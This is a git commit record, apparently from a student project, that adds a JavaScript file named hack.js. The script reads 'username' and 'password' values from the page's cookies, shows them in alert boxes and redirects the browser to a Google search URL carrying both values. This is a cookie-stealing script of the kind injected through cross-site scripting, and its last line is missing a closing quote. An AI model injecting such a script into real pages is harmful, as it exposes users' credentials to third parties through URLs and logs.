6eb4b31f599922bc44b6776520daa536d17729a0
u14017254 <michael@itecology.co.za>
2016-08-31 10:50:37 +0200

    Add files via upload

---
+++ hack.js
@@ -0,0 +1,20 @@
+alert('food');
+function getCookie(cname) {
+    var name = cname + '=';
+    var ca = document.cookie.split(';');
+    for(var i = 0; i <ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') {
+            c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+            return c.substring(name.length,c.length);
+        }
+    }
+    return '';
+}
+var username = getCookie('username');
+var password = getCookie('password');
+alert(username);
+alert(password);
+window.location='https://www.google.com/search?q='+username+'+'+password+'
